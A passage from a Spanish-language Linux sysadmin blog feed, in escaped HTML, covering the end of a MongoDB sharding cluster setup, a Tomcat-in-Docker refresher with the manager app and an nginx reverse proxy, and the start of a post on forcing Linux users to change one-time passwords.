    &lt;span class="s2"&gt;&amp;quot;clusterId&amp;quot;&lt;/span&gt; : ObjectId&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;5b182ae62446c4f43cbab312&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
  &lt;span class="o"&gt;}&lt;/span&gt;
  shards:
  active mongoses:
        &lt;span class="s2"&gt;&amp;quot;3.4.10&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;
  autosplit:
        Currently enabled: yes
  balancer:
        Currently enabled:  yes
        Currently running:  no
NaN
        Failed balancer rounds in last &lt;span class="m"&gt;5&lt;/span&gt; attempts:  &lt;span class="m"&gt;0&lt;/span&gt;
        Migration Results &lt;span class="k"&gt;for&lt;/span&gt; the last &lt;span class="m"&gt;24&lt;/span&gt; hours: 
                No recent migrations
  databases:

mongos&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para añadir &lt;em&gt;shards&lt;/em&gt; solamente tenemos que utilizar el método &lt;code&gt;sh.addShard()&lt;/code&gt; para especificar la &lt;em&gt;replica set&lt;/em&gt; que va a actuar como &lt;em&gt;shard&lt;/em&gt;; hay que añadir la &lt;em&gt;replica set&lt;/em&gt; siguiendo la fórmula &lt;code&gt;rsName/server1:port,...,serverN:port&lt;/code&gt;, aunque si especificamos uno solo nombre, basta.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mongos&amp;gt; sh.addShard&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;aquila/aquila01:27018&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;shardAdded&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;aquila&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
mongos&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: A pesar de haber dado solamente el nombre &lt;em&gt;aquila01&lt;/em&gt;, el resto de servidores ha sido descubierto por el &lt;em&gt;cluster&lt;/em&gt; de forma automática; aún así, los árbitros no aparecen en el listado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mongos&amp;gt; sh.status&lt;span class="o"&gt;()&lt;/span&gt;
--- Sharding Status --- 
  sharding version: &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;minCompatibleVersion&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;5&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;currentVersion&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;6&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;clusterId&amp;quot;&lt;/span&gt; : ObjectId&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;5b182ae62446c4f43cbab312&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
  &lt;span class="o"&gt;}&lt;/span&gt;
  shards:
        &lt;span class="o"&gt;{&lt;/span&gt;  &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;aquila&amp;quot;&lt;/span&gt;,  &lt;span class="s2"&gt;&amp;quot;host&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;aquila/aquila01:27018,aquila02:27018&amp;quot;&lt;/span&gt;,  &lt;span class="s2"&gt;&amp;quot;state&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
  active mongoses:
        &lt;span class="s2"&gt;&amp;quot;3.4.10&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;
  autosplit:
        Currently enabled: yes
  balancer:
        Currently enabled:  yes
        Currently running:  no
NaN
        Failed balancer rounds in last &lt;span class="m"&gt;5&lt;/span&gt; attempts:  &lt;span class="m"&gt;0&lt;/span&gt;
        Migration Results &lt;span class="k"&gt;for&lt;/span&gt; the last &lt;span class="m"&gt;24&lt;/span&gt; hours: 
                No recent migrations
  databases:

mongos&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a repetir la fórmula para añadir los otros &lt;em&gt;shards&lt;/em&gt;, que es básicamente la misma:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mongos&amp;gt; sh.addShard&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;lyra/lyra01:27018&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;shardAdded&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;lyra&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
mongos&amp;gt; sh.addShard&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;cygnus/cygnus01:27018&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;shardAdded&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;cygnus&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;ok&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
mongos&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y de esta forma, ya podemos ver el &lt;em&gt;cluster&lt;/em&gt; acabado, con sus 3 &lt;em&gt;shards&lt;/em&gt; añadidos sin problemas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mongos&amp;gt; sh.status&lt;span class="o"&gt;()&lt;/span&gt;
--- Sharding Status --- 
  sharding version: &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;minCompatibleVersion&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;5&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;currentVersion&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;6&lt;/span&gt;,
    &lt;span class="s2"&gt;&amp;quot;clusterId&amp;quot;&lt;/span&gt; : ObjectId&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;5b182ae62446c4f43cbab312&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
  &lt;span class="o"&gt;}&lt;/span&gt;
  shards:
        &lt;span class="o"&gt;{&lt;/span&gt;  &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;aquila&amp;quot;&lt;/span&gt;,  &lt;span class="s2"&gt;&amp;quot;host&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;aquila/aquila01:27018,aquila02:27018&amp;quot;&lt;/span&gt;,  &lt;span class="s2"&gt;&amp;quot;state&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;{&lt;/span&gt;  &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;cygnus&amp;quot;&lt;/span&gt;,  &lt;span class="s2"&gt;&amp;quot;host&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;cygnus/cygnus01:27018,cygnus02:27018&amp;quot;&lt;/span&gt;,  &lt;span class="s2"&gt;&amp;quot;state&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;{&lt;/span&gt;  &lt;span class="s2"&gt;&amp;quot;_id&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;lyra&amp;quot;&lt;/span&gt;,  &lt;span class="s2"&gt;&amp;quot;host&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;lyra/lyra01:27018,lyra02:27018&amp;quot;&lt;/span&gt;,  &lt;span class="s2"&gt;&amp;quot;state&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
  active mongoses:
        &lt;span class="s2"&gt;&amp;quot;3.4.10&amp;quot;&lt;/span&gt; : &lt;span class="m"&gt;1&lt;/span&gt;
  autosplit:
        Currently enabled: yes
  balancer:
        Currently enabled:  yes
        Currently running:  no
NaN
        Failed balancer rounds in last &lt;span class="m"&gt;5&lt;/span&gt; attempts:  &lt;span class="m"&gt;0&lt;/span&gt;
        Migration Results &lt;span class="k"&gt;for&lt;/span&gt; the last &lt;span class="m"&gt;24&lt;/span&gt; hours: 
                No recent migrations
  databases:

mongos&amp;gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como no necesitamos más el contenedor del &lt;em&gt;mongo shell&lt;/em&gt;, salimos de él para que el sistema lo pueda reciclar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mongos&amp;gt; &lt;span class="nb"&gt;exit&lt;/span&gt;
bye
/ $ &lt;span class="nb"&gt;exit&lt;/span&gt;
gerard@sirius:~/workspace/sharding$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto estamos listos para introducir nuestros datos, aunque añadir más procesos &lt;code&gt;mongos&lt;/code&gt; nos dará alta disponibilidad para el acceso de nuestras aplicaciones, aunque los &lt;em&gt;shards&lt;/em&gt; y los &lt;em&gt;config servers&lt;/em&gt; ya disfrutan de ella.&lt;/p&gt;</content><category term="mongodb"></category><category term="docker"></category><category term="sharding"></category><category term="cluster"></category></entry><entry><title>Un reciclaje de Tomcat usando Docker</title><link href="http://www.linuxsysadmin.ml/2018/06/un-reciclaje-de-tomcat-usando-docker.html" rel="alternate"></link><published>2018-06-25T10:00:00+02:00</published><updated>2018-06-25T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-06-25:/2018/06/un-reciclaje-de-tomcat-usando-docker.html</id><summary type="html">&lt;p&gt;Hace poco he cambiado de trabajo por motivos personales. En mi nueva posición me he encontrado con un cambio en las tecnologías usadas; lo que me he encontrado es algo que hacía tiempo que no tocaba: basan sus sistemas en &lt;strong&gt;Java&lt;/strong&gt; y &lt;strong&gt;Tomcat&lt;/strong&gt;. He necesitado un ligero reciclaje en ellos …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Hace poco he cambiado de trabajo por motivos personales. En mi nueva posición me he encontrado con un cambio en las tecnologías usadas; lo que me he encontrado es algo que hacía tiempo que no tocaba: basan sus sistemas en &lt;strong&gt;Java&lt;/strong&gt; y &lt;strong&gt;Tomcat&lt;/strong&gt;. He necesitado un ligero reciclaje en ellos.&lt;/p&gt;
&lt;p&gt;Por supuesto, no voy a perder el tiempo en instalar un servidor y luego el &lt;strong&gt;Tomcat&lt;/strong&gt; pertinente; experiencias pasadas nos demuestran que es mucho más fácil utilizar imágenes &lt;strong&gt;Docker&lt;/strong&gt;, que son fáciles de usar y no necesitan tiempo de &lt;em&gt;setup&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Vamos a partir de la imagen de &lt;strong&gt;Tomcat&lt;/strong&gt; oficial que podemos encontrar &lt;a href="https://hub.docker.com/_/tomcat/"&gt;aquí&lt;/a&gt;. Uno de los grandes aciertos de los que mantienen las imágenes es que, por muchos &lt;em&gt;tags&lt;/em&gt; que generen, todos funcionan bajo los mismos parámetros; esto nos permite hacer pruebas con el &lt;em&gt;tag&lt;/em&gt; de &lt;em&gt;Alpine Linux&lt;/em&gt;, y luego -si fuera necesario- saltar a algunos de los &lt;em&gt;tags&lt;/em&gt; basados en &lt;em&gt;Debian&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;En los ejemplos también se hace uso de un fichero &lt;em&gt;.war&lt;/em&gt; de prueba, llamado &lt;em&gt;sample.war&lt;/em&gt;, que he sacado de &lt;a href="https://tomcat.apache.org/tomcat-7.0-doc/appdev/sample/"&gt;aquí&lt;/a&gt;, concretamente &lt;a href="https://tomcat.apache.org/tomcat-7.0-doc/appdev/sample/sample.war"&gt;este&lt;/a&gt;. Lo que hace nuestra aplicación es irrelevante en este momento, y solamente lo vamos a utilizar para probar su disponibilidad.&lt;/p&gt;
&lt;p&gt;El concepto que debemos tener claro en una instalación de &lt;strong&gt;Tomcat&lt;/strong&gt; es la carpeta en la que está instalado, marcada por la variable de entorno CATALINA_HOME; el resto es relativo a esta carpeta. En esta imagen concreta tenemos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Carpeta base&lt;/strong&gt;: CATALINA_HOME &amp;rarr; /usr/local/tomcat&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Carpeta de aplicaciones&lt;/strong&gt;: CATALINA_HOME/webapps &amp;rarr; /usr/local/tomcat/webapps&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Carpeta de logs&lt;/strong&gt;: CATALINA_HOME/logs &amp;rarr; /usr/local/tomcat/logs&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Un despliegue básico&lt;/h2&gt;
&lt;p&gt;La opción más fácil para exponer nuestras aplicaciones es dejarlas simplemente en la carpeta de aplicaciones y reiniciar el servidor de aplicaciones. No es la opción más correcta desde el punto de vista de la disponibilidad, pero con un uso inteligente de los balanceadores es una opción válida.&lt;/p&gt;
&lt;p&gt;La idea de fondo es que &lt;strong&gt;Tomcat&lt;/strong&gt; descomprime el fichero &lt;em&gt;.war&lt;/em&gt; en el momento de levantarse. Solo tenemos que asegurar que el fichero &lt;em&gt;.war&lt;/em&gt; está en su sitio. Para ir rápido, no voy a generar imágenes nuevas y voy a inyectar el &lt;em&gt;.war&lt;/em&gt; mediante el uso de volúmenes.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/tomcat$ cat docker-compose.yml
version: &lt;span class="s1"&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
services:
  appserver:
    image: tomcat:alpine
    container_name: appserver
    hostname: appserver
    ports:
      - &lt;span class="s2"&gt;&amp;quot;8080:8080&amp;quot;&lt;/span&gt;
    volumes:
      - ./tomcat/sample.war:/usr/local/tomcat/webapps/sample.war:ro
    restart: always
gerard@atlantis:~/workspace/tomcat$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos queda levantar el servicio, pudiendo encontrar el resultado en &lt;a href="http://localhost:8080/sample/"&gt;http://localhost:8080/sample/&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/tomcat$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;tomcat_default&amp;quot;&lt;/span&gt; with the default driver
Creating appserver ... &lt;span class="k"&gt;done&lt;/span&gt;
gerard@atlantis:~/workspace/tomcat$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Exponiendo el manager&lt;/h2&gt;
&lt;p&gt;Cuando tenemos una aplicación es natural que hayan evolutivos y se necesite cambiar el fichero. Como &lt;strong&gt;Tomcat&lt;/strong&gt; maneja varias aplicaciones, un reinicio las afecta a todas y causa un &lt;em&gt;downtime&lt;/em&gt; importante, por no mencionar que el tiempo para levantar el servicio se dispara.&lt;/p&gt;
&lt;p&gt;Afortunadamente, &lt;strong&gt;Tomcat&lt;/strong&gt; nos ofrece una aplicación que tiene como única finalidad, administrar otras aplicaciones. Es el &lt;em&gt;manager&lt;/em&gt; y lo podemos localizar en &lt;a href="http://localhost:8080/manager/html"&gt;http://localhost:8080/manager/html&lt;/a&gt;, o siguiendo un botón desde la página inicial en &lt;a href="http://localhost:8080/"&gt;http://localhost:8080/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Este &lt;em&gt;manager&lt;/em&gt; se puede acceder definiendo un usuario en &lt;code&gt;conf/tomcat-users.xml&lt;/code&gt;, y por defecto permite entrar a los usuario en la máquina local. Este comportamiento se puede cambiar mediante un fichero de contexto, que pondremos en &lt;code&gt;conf/Catalina/localhost/&amp;lt;aplicación&amp;gt;.xml&lt;/code&gt;. Veamos como habilitar el &lt;em&gt;manager&lt;/em&gt; y el &lt;em&gt;host-manager&lt;/em&gt;, mediante el añadido de los ficheros de configuración usando volúmenes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/tomcat$ cat docker-compose.yml
version: &lt;span class="s1"&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
services:
  appserver:
    image: tomcat:alpine
    container_name: appserver
    hostname: appserver
    ports:
      - &lt;span class="s2"&gt;&amp;quot;8080:8080&amp;quot;&lt;/span&gt;
    volumes:
      - ./tomcat/tomcat-users.xml:/usr/local/tomcat/conf/tomcat-users.xml:ro
      - ./tomcat/context.xml:/usr/local/tomcat/conf/Catalina/localhost/manager.xml:ro
      - ./tomcat/context.xml:/usr/local/tomcat/conf/Catalina/localhost/host-manager.xml:ro
    restart: always
gerard@atlantis:~/workspace/tomcat$
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/tomcat$ cat tomcat/tomcat-users.xml
&amp;lt;?xml &lt;span class="nv"&gt;version&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;encoding&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;UTF-8&amp;quot;&lt;/span&gt;?&amp;gt;
&amp;lt;tomcat-users &lt;span class="nv"&gt;xmlns&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://tomcat.apache.org/xml&amp;quot;&lt;/span&gt;
              xmlns:xsi&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot;&lt;/span&gt;
              xsi:schemaLocation&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://tomcat.apache.org/xml tomcat-users.xsd&amp;quot;&lt;/span&gt;
              &lt;span class="nv"&gt;version&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1.0&amp;quot;&lt;/span&gt;&amp;gt;
  &amp;lt;role &lt;span class="nv"&gt;rolename&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;manager-gui&amp;quot;&lt;/span&gt;/&amp;gt;
  &amp;lt;role &lt;span class="nv"&gt;rolename&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;admin-gui&amp;quot;&lt;/span&gt;/&amp;gt;
  &amp;lt;user &lt;span class="nv"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;manager&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;manager1234&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;roles&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;manager-gui,admin-gui&amp;quot;&lt;/span&gt;/&amp;gt;
&amp;lt;/tomcat-users&amp;gt;
gerard@atlantis:~/workspace/tomcat$
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/tomcat$ cat tomcat/context.xml
&amp;lt;Context &lt;span class="nv"&gt;privileged&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;true&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;antiResourceLocking&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;false&amp;quot;&lt;/span&gt;
         &lt;span class="nv"&gt;docBase&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;catalina&lt;/span&gt;&lt;span class="p"&gt;.home&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;/webapps/manager&amp;quot;&lt;/span&gt;&amp;gt;
    &amp;lt;Valve &lt;span class="nv"&gt;className&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;org.apache.catalina.valves.RemoteAddrValve&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;allow&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;^.*&lt;/span&gt;$&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; /&amp;gt;
&amp;lt;/Context&amp;gt;
gerard@atlantis:~/workspace/tomcat$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Como el contenido del fichero &lt;code&gt;context.xml&lt;/code&gt; vale para habilitar ambas aplicaciones, podemos crear la ilusión dentro del contenedor de que son 2 ficheros, aunque realmente se trata del mismo.&lt;/p&gt;
&lt;p&gt;Con esto deberíamos ser capaces de acceder al &lt;em&gt;manager&lt;/em&gt; y al &lt;em&gt;host-manager&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Añadiendo virtualhosts&lt;/h2&gt;
&lt;p&gt;Cada aplicación que pongamos en &lt;strong&gt;Tomcat&lt;/strong&gt; acaba disponible en &lt;code&gt;http://dominio:8080/&amp;lt;aplicacion&amp;gt;/&lt;/code&gt;. Esto nos plantea una serie de cuestiones:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Como montamos una aplicación por (sub)dominio?&lt;/li&gt;
&lt;li&gt;Como nos libramos de la coletilla &lt;code&gt;/&amp;lt;aplicacion&amp;gt;/&lt;/code&gt;?&lt;/li&gt;
&lt;li&gt;Como añado autenticación básica?&lt;/li&gt;
&lt;li&gt;Como tratamos una terminación SSL?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;El servidor de aplicaciones &lt;strong&gt;Tomcat&lt;/strong&gt; no se encarga de eso. Si bien es cierto que se puede encargar de la parte de SSL, es una configuración complicada; la parte de los dominios se debería tratar en la aplicación misma, con lo que es trabajo extra y la limpieza de la URL es imposible.&lt;/p&gt;
&lt;p&gt;En estos casos, la recomendación es tener un &lt;em&gt;proxy reverso&lt;/em&gt; delante que cree estas ilusiones de forma fácil y confiable; mi recomendación personal es poner un &lt;strong&gt;nginx&lt;/strong&gt;, que resume todo el truco en un fichero de configuración y que podemos inyectar también como un volumen.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/tomcat$ cat docker-compose.yml
version: &lt;span class="s1"&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
services:
  webserver:
    image: sirrtea/nginx:alpine
    container_name: webserver
    hostname: webserver
    ports:
      - &lt;span class="s2"&gt;&amp;quot;8080:80&amp;quot;&lt;/span&gt;
    volumes:
      - ./nginx/sample.conf:/etc/nginx/conf.d/sample.conf:ro
    depends_on:
      - appserver
    restart: always
  appserver:
    image: tomcat:alpine
    container_name: appserver
    hostname: appserver
    volumes:
      - ./tomcat/sample.war:/usr/local/tomcat/webapps/sample.war:ro
    restart: always
gerard@atlantis:~/workspace/tomcat$
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/workspace/tomcat$ cat nginx/sample.conf
server &lt;span class="o"&gt;{&lt;/span&gt;
        listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        server_name sample.example.com&lt;span class="p"&gt;;&lt;/span&gt;
        location / &lt;span class="o"&gt;{&lt;/span&gt;
                proxy_pass http://appserver:8080/sample/&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@atlantis:~/workspace/tomcat$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras levantar el conjunto de contenedores con &lt;em&gt;docker-compose&lt;/em&gt;, sucede la magia:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Solo llegaremos al &lt;strong&gt;Tomcat&lt;/strong&gt; mediante el dominio &lt;code&gt;sample.example.com&lt;/code&gt;, puerto 80&lt;/li&gt;
&lt;li&gt;Todas las peticiones hechas a &lt;code&gt;/loremipsum&lt;/code&gt; van parar a &lt;code&gt;appserver:8080/sample/loremipsum&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;El &lt;strong&gt;Nginx&lt;/strong&gt; consume la parte de la aplicación &lt;code&gt;/sample&lt;/code&gt; en la URL&lt;/li&gt;
&lt;li&gt;No hay SSL en este ejemplo, pero ponerlo no entraña ninguna dificultad extra&lt;/li&gt;
&lt;li&gt;No se ha puesto autenticación básica, pero tampoco cuesta demasiado&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Con esto podemos ocultar el &lt;em&gt;manager&lt;/em&gt; y otras aplicaciones, que podríamos exponer mediante otros (sub)dominios, o puertos; eso nos permite hacer un uso inteligente de un &lt;em&gt;firewall&lt;/em&gt; para evitar la exposición de partes privadas de nuestro proyecto.&lt;/p&gt;</content><category term="tomcat"></category><category term="docker"></category></entry><entry><title>Contraseñas de un solo uso para usuarios linux</title><link href="http://www.linuxsysadmin.ml/2018/06/contrasenas-de-un-solo-uso-para-usuarios-linux.html" rel="alternate"></link><published>2018-06-18T10:00:00+02:00</published><updated>2018-06-18T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-06-18:/2018/06/contrasenas-de-un-solo-uso-para-usuarios-linux.html</id><summary type="html">&lt;p&gt;No dejan de sorprenderme los administradores de sistemas que crean usuarios a petición, pero les asignan &lt;em&gt;passwords&lt;/em&gt; supuestamente de un solo uso pidiéndoles que la cambien en el primer uso. La experiencia me dice que esa &lt;em&gt;password&lt;/em&gt; solo se cambia si es estrictamente necesario. Esta petición la puedes forzar fácilmente …&lt;/p&gt;</summary><content type="html">&lt;p&gt;No dejan de sorprenderme los administradores de sistemas que crean usuarios a petición, pero les asignan &lt;em&gt;passwords&lt;/em&gt; supuestamente de un solo uso pidiéndoles que la cambien en el primer uso. La experiencia me dice que esa &lt;em&gt;password&lt;/em&gt; solo se cambia si es estrictamente necesario. Esta petición la puedes forzar fácilmente.&lt;/p&gt;
&lt;h2&gt;Un ejemplo&lt;/h2&gt;
&lt;p&gt;Vamos a simular una de estas peticiones, de un usuario &lt;em&gt;bob&lt;/em&gt; que quiere acceder a un servidor llamado &lt;em&gt;server&lt;/em&gt;. Un administrador tradicional va a ejecutar un comando estándar para crear el usuario, y le va a asignar una contraseña, posiblemente de diccionario.&lt;/p&gt;
&lt;h3&gt;El problema&lt;/h3&gt;
&lt;p&gt;El servidor en cuestión es un servidor simulado, montado con &lt;strong&gt;Alpine Linux&lt;/strong&gt;, y esto es lo que se ejecutaría en él:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/ &lt;span class="c1"&gt;# adduser -D bob&lt;/span&gt;
/ &lt;span class="c1"&gt;# echo &amp;quot;bob:temporal&amp;quot; | chpasswd &lt;/span&gt;
chpasswd: password &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;bob&amp;#39;&lt;/span&gt; changed
/ &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Le mandamos el par de usuario y contraseña al usuario, muchas veces usando un canal relativamente inseguro, como el correo electrónico o mediante un &lt;em&gt;post-it&lt;/em&gt;. Le pedimos al usuario que la cambie, pero no podemos obligarle. Simplemente quiere entrar al servidor.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/workspace/server$ ssh bob@server
bob@localhost&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 
Welcome to Alpine!

